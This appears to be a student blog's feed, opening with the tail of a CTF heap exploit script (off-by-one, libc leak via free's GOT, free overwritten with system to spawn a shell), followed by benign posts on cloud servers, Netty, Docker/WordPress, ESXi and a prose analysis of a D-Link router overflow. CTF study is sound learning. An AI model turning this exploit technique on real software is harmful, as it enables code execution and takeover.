:&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;bbbb&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)  <span class="comment">#2</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x41&#x27;</span>)  <span class="comment">#1 利用off by one将chunk1 的大小写为0x41 </span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">    <span class="comment">#写入free_got泄露libc地址</span></span><br><span class="line">add(<span class="number">0x38</span>,payload) <span class="comment"># 1</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">libcbase=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_addr=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">success(<span class="string">&#x27;system: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr)) <span class="comment"># 将free地址覆盖为system地址，当执行free时即调用的是system函数</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">2</span>)  <span class="comment"># /bin/sh</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="堆" scheme="http://example.com/categories/%E5%A0%86/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>腾讯云服务器初体验</title>
    <link href="http://example.com/2021/01/04/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://example.com/2021/01/04/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2021-01-04T13:50:23.000Z</published>
    <updated>2021-01-05T11:56:37.406Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>在好奇心的趋势下，我花了27个大洋在腾讯云上买了三个月的学生机打算探索一番。关键是这几个月一直在学习关于服务器的东西，想来也有一部分关系吧。</p><p>首先吐槽一下我自己，关于云服务器，真的是一点都不懂，问啥啥不知道，配置全靠度娘。</p><p>先说一下配置：</p><p>​                    1核的cpu</p><p>​                    2GB的内存</p><p>​                    1Mbps的带宽</p><p>​                    50GB的云盘</p><p>尝试之后我只能说，这种配置玩玩搭个网站就行了，别整花的，带不动。。。。。</p><p>下面来说一下我暂时知道的能干些啥：</p><p>第一：搭个博客（当然搭网站也可以，只要访问量不大，不怕被攻击，可以尝试。）</p><p>最简单的就是利用docker+wordpress+mysql搭建个人博客，方便快捷简单，教程可以参考我已经写过的文章“硬件实训2-2”</p><p>第二：搭建个人云盘</p><p>其实只要用量不大，搭建个云盘还是可以的，最起码上传速度和下载速度比某度快吧。</p><p>我是利用docker+NextCloud搭建的，方法简单网上全是教程，这里就不啰嗦了。</p><p>暂时我也就玩出着这两个花样，如果读者有更多骚操作还请在评论下説說，俺也想试试！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="腾讯云" scheme="http://example.com/categories/%E8%85%BE%E8%AE%AF%E4%BA%91/"/>
    
    
    <category term="服务器" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>初探netty</title>
    <link href="http://example.com/2021/01/03/%E5%88%9D%E6%8E%A2netty/"/>
    <id>http://example.com/2021/01/03/%E5%88%9D%E6%8E%A2netty/</id>
    <published>2021-01-03T12:36:20.000Z</published>
    <updated>2021-01-04T14:05:50.602Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="关于netty"><a href="#关于netty" class="headerlink" title="关于netty"></a>关于netty</h1><p>netty与我的境遇发生在给别人写课设之中！！！</p><p>听起来是不是很意外，那是一个夜黑风高的夜晚，外面下着大雨，皎洁的夜光照在我的脸上，此时一名joker正在看这篇博客……………(皮一下🤭)</p><p>netty官方源码（例子及用法说明一应俱全）：<a href="https://netty.io/wiki/index.html">https://netty.io/wiki/index.html</a></p><p>netty在github的源码地址：<a href="https://github.com/netty/netty">https://github.com/netty/netty</a></p><p>netty是我第一次关于服务器方面的应用开发的学习，虽然学校并没又这一门课，但是感觉还是蛮重要的而且很有趣就试着自学一下。</p><h2 id="netty是什么"><a href="#netty是什么" class="headerlink" title="netty是什么"></a>netty是什么</h2><p>netty是一个异步的，事件驱动的网络编程框架。</p><p>netty是一个基于NIO（非阻塞IO）开发的网络通信框架。既然说到了NIO就提一下BIO（阻塞IO）。</p><p>NIO，同步非阻塞IO，阻塞业务处理但不阻塞数据接收，适用于高并发且处理简单的场景，比如聊天软件。</p><p>BIO，同步阻塞IO，阻塞整个步骤，如果连接少，他的延迟是最低的，因为一个线程只处理一个连接，适用于少连接且延迟低的场景，比如说数据库连接。</p><p>两种I/O模型的对比：</p><p><img src="/postimg/netty-1.png">    <img src="/postimg/netty-2.png"></p><p>可以清楚的看到NIO在处理单线程的连接数量要比BIO高出很多。</p><h2 id="netty与tomcat"><a href="#netty与tomcat" class="headerlink" title="netty与tomcat"></a>netty与tomcat</h2><p>netty与tomcat一样，都是基于java的web服务。两者最大的区别在与通信协议。tomcat是基于http协议的，而netty则可以通过编程自定义各种协议。而且，netty调用API及其简单容易。</p><h2 id="netty的优势"><a href="#netty的优势" class="headerlink" title="netty的优势"></a>netty的优势</h2><p><strong>1、并发高</strong></p><p><strong>2、传输快</strong></p><p><strong>3、封装好</strong></p><p>​    前面已经说过，netty是一款基于NIO开发的网络通信框架，NIO是多个Socket对一个Selector，而BIO是一个Socket对一个Selector，在处理连接数量上NIO要比BIO高出很多，这也是为什么netty的并发性高的原因。</p><p>​    其次，netty依赖了NIO”零拷贝“特性，当他需要接收数据的时候，他会在堆内存之外开辟一块内存，数据就直接从IO读到了那块内存中去，在netty里面通过ByteBuf可以直接对这些数据进行直接操作，从而加快了传输速度。Java的内存有堆内存、栈内存和字符串常量池等等，其中堆内存是占用内存空间最大的一块，也是Java对象存放的地方，一般我们的数据如果需要从IO读取到堆内存，中间需要经过Socket缓冲区，也就是说一个数据会被拷贝两次才能到达他的的终点，如果数据量大，就会造成不必要的资源浪费。</p><p>​    Netty封装了NIO操作的很多细节，提供易于使用的API。</p><h2 id="根据源码测试echo和http-helloworld："><a href="#根据源码测试echo和http-helloworld：" class="headerlink" title="根据源码测试echo和http-helloworld："></a>根据源码测试echo和http-helloworld：</h2><p><img src="/postimg/netty-3.png"></p><p>echo：</p><p><img src="/postimg/netty-4.png">  <img src="/postimg/netty-5.png"></p><p>helloworld:</p><p><img src="/postimg/netty-6.png">   <img src="/postimg/netty-7.png"></p><p>源码已发布在gitee上，持续更新地址：<a href="https://gitee.com/tordan/study-netty">https://gitee.com/tordan/study-netty</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="netty服务器" scheme="http://example.com/categories/netty%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    
    <category term="netty" scheme="http://example.com/tags/netty/"/>
    
  </entry>
  
  <entry>
    <title>硬件实训2-2</title>
    <link href="http://example.com/2020/12/27/%E7%A1%AC%E4%BB%B6%E5%AE%9E%E8%AE%AD2-2/"/>
    <id>http://example.com/2020/12/27/%E7%A1%AC%E4%BB%B6%E5%AE%9E%E8%AE%AD2-2/</id>
    <published>2020-12-27T03:04:49.000Z</published>
    <updated>2020-12-27T04:32:55.901Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p><strong>任务：利用docker搭建一个本地的cms</strong></p><p><strong>目的：熟悉docker的使用，学习基于容器的应用部署</strong></p><h1 id="引题"><a href="#引题" class="headerlink" title="引题"></a>引题</h1><p>​    docker其实是一种虚拟化的技术，当前我们所了解的虚拟化可以分为主机虚拟化（熟知的vmware）和容器虚拟化（即docker），区别在于容器虚拟化的是操作系统而不是硬件，主机虚拟化是在物理机的基础上再搭建一个完整的主机系统。</p><p>​    用一句话来概括的话，主机级虚拟化就是通过各种各样的手段，把物理资源重新分配，然后抽象出一部分拿来做虚拟机的虚拟硬件，是对硬件的模拟；而容器虚拟化技术相当于把操作系统进行虚拟化，把物理的操作系统模拟为逻辑上的多个操作系统，不同的操作系统有自己的用户空间，实现了应用程序间的隔离。</p><p><strong>两者的对比：</strong></p><p>传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-1.png"></p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-2.png"></p><p>总结一下docker的优势：运行环境一致、更快的启动速度、隔离性、快速扩展、迁移方便、持续交付和部署、高内聚和低耦合。</p><h2 id="docker基本概念"><a href="#docker基本概念" class="headerlink" title="docker基本概念"></a>docker基本概念</h2><p><strong>Image（镜像）——一个特殊的文件系统:</strong></p><p>相当于是一个 root 文件系统，用于创建 Docker 容器的模板，比如 Ubuntu 系统。</p><p><strong>Container（容器）——镜像运行时的实体:</strong></p><p>容器是独立运行的一个或一组应用，是镜像运行时的实体,镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p><p><strong>Repository（仓库）——集中存放镜像文件的地方:</strong></p><p>仓库可看成一个代码控制中心，用来保存镜像。Docker Hub(<a href="https://hub.docker.com/">https://hub.docker.com</a>) 提供了庞大的镜像集合供使用。一个 Docker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。</p><p>展示一下我的镜像仓库：</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-3.png"></p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>利用不同平台搭建blog</p><p><strong>常用的命令:</strong></p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">sudo docker ps <span class="comment">#查看正在运行的container</span></span><br><span class="line">sudo docker ps -a <span class="comment">#查看本地container列表</span></span><br><span class="line">sudo docker images <span class="comment">#查看本地镜像</span></span><br><span class="line">sudo docker -v <span class="comment">#查看docker版本</span></span><br><span class="line">sudo docker-compose -v <span class="comment">#查看docker-compose版本</span></span><br><span class="line">sudo docker-compose up -d <span class="comment">#建立连接运行镜像</span></span><br><span class="line">sudo docker pull tag <span class="comment">#从仓库pull一个镜像到本地</span></span><br><span class="line">sudo docker push tag <span class="comment">#从本地push一个镜像到仓库</span></span><br><span class="line">sudo docker <span class="keyword">run</span><span class="bash"> -it 镜像名称 /bin/bash <span class="comment">#使用某一镜像来运行容器</span></span></span><br><span class="line">sudo docker <span class="keyword">run</span><span class="bash"> -it 容器id /bin/bash <span class="comment">#启动某一容器（退出时容器会关闭）</span></span></span><br><span class="line">sudo docker exec -it 容器id /bin/bash <span class="comment">#启动某一容器（退出时容器不会关闭）</span></span><br><span class="line">sudo docker stop container/image <span class="comment">#停止镜像或容器运行</span></span><br><span class="line">sudo docker start container/image <span class="comment">#开启镜像或容器</span></span><br><span class="line">sudo docker rm container <span class="comment">#删除容器</span></span><br><span class="line">sudo docker rmi image <span class="comment">#删除镜像</span></span><br></pre></td></tr></table></figure><p><strong>1、安装docker</strong></p><p>菜鸟教程提供了一键安装的命令可以直接使用：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-4.png"></p><p><strong>2、更新 apt 包索引</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-5.png"></p><p><strong>3、更新仓库源：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   &quot;deb [arch&#x3D;amd64] https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F; \</span><br><span class="line">  $(lsb_release -cs) \</span><br><span class="line">  stable&quot;</span><br></pre></td></tr></table></figure><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-6.png"></p><p><strong>4、查看docker版本：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker -v</span><br></pre></td></tr></table></figure><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-9.png"></p><p><strong>5、测试docker是否已经安装成功可以运行：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-7.png"></p><p><strong>6、下载是用于定义和运行多容器 Docker 应用程序的工具docker-compose</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-compose</span><br></pre></td></tr></table></figure><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-8.png"></p><p><strong>至此，我们的环境已经搭建完毕，下面就开始搭建blog</strong></p><p>我打算利用mysql+wordpress来搭建一个cms</p><p>环境：ubuntu16.04、mysql5.6、wordpress:latest</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-10.png"></p><p>环境已经编号，下面来编写docker-compose.yml文件</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3&#x27;</span>         <span class="comment"># docker-compose的版本</span></span><br><span class="line">services: <span class="comment">#一个service表示一个container</span></span><br><span class="line">  wordpress:</span><br><span class="line">    image: wordpress     <span class="comment">#选择镜像</span></span><br><span class="line">    restart: always      <span class="comment">#重启策略</span></span><br><span class="line">    ports: <span class="comment">#映射到本地的80端口</span></span><br><span class="line">      - <span class="number">80</span>:<span class="number">80</span></span><br><span class="line">    environment:</span><br><span class="line">      WORDPRESS_DB_HOST: db                  <span class="comment">#wordpress的选择的数据库</span></span><br><span class="line">      WORDPRESS_DB_USER: exampleuser         <span class="comment">#数据库用户</span></span><br><span class="line">      WORDPRESS_DB_PASSWORD: examplepass     <span class="comment">#数据库密码</span></span><br><span class="line">      WORDPRESS_DB_NAME: exampledb           <span class="comment">#数据库名</span></span><br><span class="line">    networks:</span><br><span class="line">      - jackxu-net                           <span class="comment">#配置容器连接的网络</span></span><br><span class="line">    volumes:</span><br><span class="line">      - wordpress:/var/www/html              <span class="comment">#将主机的数据卷或着文件挂载到容器里</span></span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: mysql:<span class="number">5.6</span>                         <span class="comment">#镜像</span></span><br><span class="line">    restart: always                          <span class="comment">#重启策略</span></span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_DATABASE: exampledb              <span class="comment">#mysql名</span></span><br><span class="line">      MYSQL_USER: exampleuser                <span class="comment">#mysql用户</span></span><br><span class="line">      MYSQL_PASSWORD: examplepass            <span class="comment">#mysql密码</span></span><br><span class="line">      MYSQL_RANDOM_ROOT_PASSWORD: <span class="string">&#x27;1&#x27;</span>        <span class="comment">#随机一个root账户密码</span></span><br><span class="line">    volumes:</span><br><span class="line">      - db:/var/lib/mysql</span><br><span class="line">    networks:</span><br><span class="line">      - jackxu-net</span><br><span class="line"></span><br><span class="line">volumes:</span><br><span class="line">  wordpress:</span><br><span class="line">  db:</span><br><span class="line">  </span><br><span class="line">networks:</span><br><span class="line">  jackxu-net:</span><br><span class="line">    driver: bridge                          <span class="comment">#桥接模式 </span></span><br></pre></td></tr></table></figure><p>运行脚本</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-11.png"></p><p>然后进入本地的80端口开始博客的配置</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-12.png"></p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-13.png"></p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-14.png"></p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-15.png"></p><p>然后可以美化自己的本地博客，至此，利用docker搭建本地cms完成</p><h1 id="成果图："><a href="#成果图：" class="headerlink" title="成果图："></a>成果图：</h1><p><img src="/postimg/%E5%AE%9E%E8%AE%AD3-16.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="docker、docker-compose、wordpress" scheme="http://example.com/categories/docker%E3%80%81docker-compose%E3%80%81wordpress/"/>
    
    
    <category term="硬件实训" scheme="http://example.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%9E%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>硬件实训2-1</title>
    <link href="http://example.com/2020/12/27/%E7%A1%AC%E4%BB%B6%E5%AE%9E%E8%AE%AD2-1/"/>
    <id>http://example.com/2020/12/27/%E7%A1%AC%E4%BB%B6%E5%AE%9E%E8%AE%AD2-1/</id>
    <published>2020-12-27T03:04:40.000Z</published>
    <updated>2020-12-27T13:24:55.756Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h3 id="任务："><a href="#任务：" class="headerlink" title="任务："></a>任务：</h3><p>VMware虚拟化ESXi的安装，并在ESXi中创建虚拟机。老师要求是要装Vcenter然后进行实验的，奈何本人笔记本太le se，内存实在太小装不了呀。呜呜呜。。。。</p><h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><p>VMware® Workstation 16 Pro、VMware ESXi 6.7、win10</p><h3 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h3><p><strong>ESXI的搭建:</strong></p><p>第一步自然是进官网下载ESXi的iso文件，没有iso可什么都做不了</p><p>下载完成开始安装：</p><p>vmware的使用的搭建肯定都会，就不演示了，下面来演示一下安装过程</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-1.png"></p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-2.png"></p><p>continue继续</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-3.png"></p><p>f11继续下一步安装</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-4.png"></p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-5.png"></p><p>这是关于使用的ESXi空间，默认continue继续</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-6.png"></p><p>默认美式键盘继续</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-7.png"></p><p>设置密码，注意要包含字母、数字和符号</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-8.png"></p><p>已经基本配置完成，f11开始下载</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-9.png"></p><p>下载完成，重启</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-10.png"></p><p>至此已经安装完成，我使用的是虚拟机的net模式，如果要使用桥接还需要进行配置：</p><p>f2进入设置</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-11.png"></p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-12.png"></p><p>在这个页面你可你选择你的网络连接模式，重启网络，设置密码等</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-13.png"></p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-14.png"></p><p>全部设置完成后就可以在浏览器界面管理你的服务器了：</p><p>（注意网址是你ESXi界面的DHCP地址）</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-15.png"></p><p>在这里可以查看服务器的所有信息并管理设置服务器</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-16.png"></p><h3 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h3><p>在服务器内创建一个ubuntu 20.04的虚拟机</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-17.png"></p><p>导入镜像启动，成功在ESXi内创建虚拟机</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-18.png"></p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD2-19.png"></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>在这次实验中，我学到了ESXI的安装配置以及在如何在自己搭建的服务器内创建虚拟机，感觉很有意思，之前都是在vmware里直接搭建虚拟机，没想到还能再vmware内搭建服务器后在服务器里搭建虚拟机，像套娃一样，很有意思，遗憾的是电脑不行，没法搭建Vcenter，以后有机会了我一定要试试，同时，这也是我第一次做服务器相关的实验，学到了很多东西，在实验的过程从也有很多问题，比如ping不通网，网络跳跃点一直在两个网址之间循环，最后请教了网络的一个大佬解决了问题，原来是DNS更新的问题，清除用flushdns命令清处dns缓存后再重启虚拟机net模式的适配器就解决该问题了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="exsi" scheme="http://example.com/categories/exsi/"/>
    
    
    <category term="硬件实训" scheme="http://example.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%9E%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>小试牛刀iot</title>
    <link href="http://example.com/2020/12/19/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80iot/"/>
    <id>http://example.com/2020/12/19/%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80iot/</id>
    <published>2020-12-19T08:34:47.000Z</published>
    <updated>2020-12-19T09:43:16.257Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="查找方法"><a href="#查找方法" class="headerlink" title="查找方法"></a>查找方法</h1><p>过于漏洞记录的网站国内外有很多，我只介绍下面两个：</p><h4 id="利用cve-list查询已经发布的漏洞："><a href="#利用cve-list查询已经发布的漏洞：" class="headerlink" title="利用cve list查询已经发布的漏洞："></a>利用cve list查询已经发布的漏洞：</h4><p><a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=camera">https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=camera</a></p><p><img src="/postimg/iot-1.png"></p><p><img src="/postimg/iot-2.png"></p><h4 id="利用exploit-database查询，在我看来，exploit-database的数据更将丰富清晰，但是漏洞库相比较少。"><a href="#利用exploit-database查询，在我看来，exploit-database的数据更将丰富清晰，但是漏洞库相比较少。" class="headerlink" title="利用exploit database查询，在我看来，exploit database的数据更将丰富清晰，但是漏洞库相比较少。"></a>利用exploit database查询，在我看来，exploit database的数据更将丰富清晰，但是漏洞库相比较少。</h4><p><a href="https://www.exploit-db.com/exploits">https://www.exploit-db.com/exploits</a></p><p><img src="/postimg/iot-3.png"></p><p><img src="/postimg/iot-4.png"></p><h4 id="工欲善其事必先利其器"><a href="#工欲善其事必先利其器" class="headerlink" title="工欲善其事必先利其器"></a>工欲善其事必先利其器</h4><p>binwalk（解压固件包、查看固件信息） + ghidra（调试） </p><p>下载地址：<a href="https://pan.baidu.com/s/1IY5YiIXuEmsCvglt0qgrzw">https://pan.baidu.com/s/1IY5YiIXuEmsCvglt0qgrzw</a> 提取码: 78tu </p><h3 id="关于固件的下载和说明文档，我的建议是————百度"><a href="#关于固件的下载和说明文档，我的建议是————百度" class="headerlink" title="关于固件的下载和说明文档，我的建议是————百度"></a>关于固件的下载和说明文档，我的建议是————百度</h3><h4 id="下面我来介绍一个例子：D-Link-DIR-645路由器"><a href="#下面我来介绍一个例子：D-Link-DIR-645路由器" class="headerlink" title="下面我来介绍一个例子：D-Link DIR-645路由器"></a>下面我来介绍一个例子：D-Link DIR-645路由器</h4><p><strong>漏洞描述：</strong></p><p><img src="/postimg/iot-5.png"></p><p><strong>固件下载地址：</strong></p><p>链接: <a href="https://pan.baidu.com/s/1C1koxw1r6uOHzoNAo7PrmQ">https://pan.baidu.com/s/1C1koxw1r6uOHzoNAo7PrmQ</a> 提取码: mta9 </p><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>__查询签名得到架构的信息__（一般是x86，x86_64，i386，amd64，mips，arm）</p><p><img src="/postimg/iot-6.png"></p><p>（啥都没有，没关系）</p><p><strong>解压：</strong></p><p><img src="/postimg/iot-7.png"></p><p><strong>搜索busy文件查看系统构架：</strong></p><p>busybox是嵌入式设备常用（基本上都要用）的工具，它里面集成了很多linux常用命令并且文件本身比较小。这里搜索到了这个文件说明解压成功了（也可以通过tree命令查看目录里面文件多少判断是否解压成功）</p><p><img src="/postimg/iot-8.png"></p><p><img src="/postimg/iot-9.png"></p><p>32位，mips架构</p><h3 id="查看漏洞："><a href="#查看漏洞：" class="headerlink" title="查看漏洞："></a>查看漏洞：</h3><p>根据搜索到的文档，我们已经知道漏洞在文件authentication.cgi中，所以我们在解压的固件中直接查找此文件,这是一个公共网关接口，而真正的目标文件是cgibin</p><p><img src="/postimg/iot-11.png"></p><p>(ll不是linux下一个基本的命令，它实际上是ls -l的一个别名)</p><p><img src="/postimg/iot-12.png"></p><p>顺便提一下，有时候分析文章是没有给出是哪个文件</p><p>一般是httpd文件(如果是http服务的漏洞)</p><p><img src="/postimg/iot-10.png"></p><p>在找到文件后直接拖入ida7.5（可以打开mips架构文件）中，</p><p>寻找authenticatecgi_main函数：</p><p><img src="/postimg/iot-13.png"></p><p>漏洞所在：read函数没有验证参数nbytes大小，将用户可控的输入内容放置大小固定的栈中局部变量，从而发生溢出！</p><p><img src="/postimg/iot-14.png"></p><p>具体调试及复现可以参考：</p><p><a href="https://bbs.pediy.com/thread-259274.htm">https://bbs.pediy.com/thread-259274.htm</a></p><p><strong>附：</strong></p><p>ubuntu的apt及pip自动下载换源脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [*]change ubuntu system sources to aliyun source</span></span><br><span class="line"><span class="comment">#:&lt;&lt;BLOCK</span></span><br><span class="line">sudo mv /etc/apt/sources.list /etc/apt/sources.list.bak.1</span><br><span class="line"></span><br><span class="line">codename=`lsb_release -c | cut -c 11-`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;codename is <span class="variable">$codename</span>&quot;</span></span><br><span class="line"></span><br><span class="line">sudo touch /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">sudo <span 